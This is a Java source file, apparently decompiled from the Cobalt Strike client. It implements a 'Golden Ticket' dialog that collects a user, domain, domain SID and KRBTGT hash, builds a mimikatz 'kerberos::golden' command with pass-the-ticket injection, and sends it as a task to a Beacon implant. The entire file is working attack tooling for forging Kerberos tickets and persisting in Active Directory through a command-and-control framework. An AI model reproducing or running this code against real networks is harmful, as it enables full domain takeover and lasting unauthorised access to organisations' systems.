package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import java.awt.event.ActionEvent;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class GoldenTicketDialog implements DialogListener {
   protected JFrame dialog = null;
   protected AggressorClient client = null;
   protected String bid = null;

   public GoldenTicketDialog(AggressorClient var1, String var2) {
      this.client = var1;
      this.bid = var2;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      StringBuffer var3 = new StringBuffer("kerberos::golden /user:");
      var3.append(DialogUtils.string(var2, "user"));
      var3.append(" /domain:");
      var3.append(DialogUtils.string(var2, "domain"));
      var3.append(" /sid:");
      var3.append(DialogUtils.string(var2, "sid"));
      var3.append(" /krbtgt:");
      var3.append(DialogUtils.string(var2, "hash"));
      var3.append(" /endin:480 /renewmax:10080 /ptt");
      TaskBeacon var4 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
      DialogUtils.openOrActivate(this.client, this.bid);
      var4.input("mimikatz " + var3.toString());
      var4.MimikatzSmall(var3.toString());
      this.client.getConnection().call("armitage.broadcast", CommonUtils.args("goldenticket", var2));
   }

   public void show() {
      this.dialog = DialogUtils.dialog("Golden Ticket", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.set(DataUtils.getGoldenTicket(this.client.getData()));
      var1.text("user", "User:", 20);
      var1.text("domain", "Domain:", 20);
      var1.text("sid", "Domain SID:", 20);
      var1.krbtgt("hash", "KRBTGT Hash:", this.client);
      JButton var2 = var1.action("Build");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-golden-ticket");
      this.dialog.add(DialogUtils.description("This dialog generates a golden ticket and injects it into the current session."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
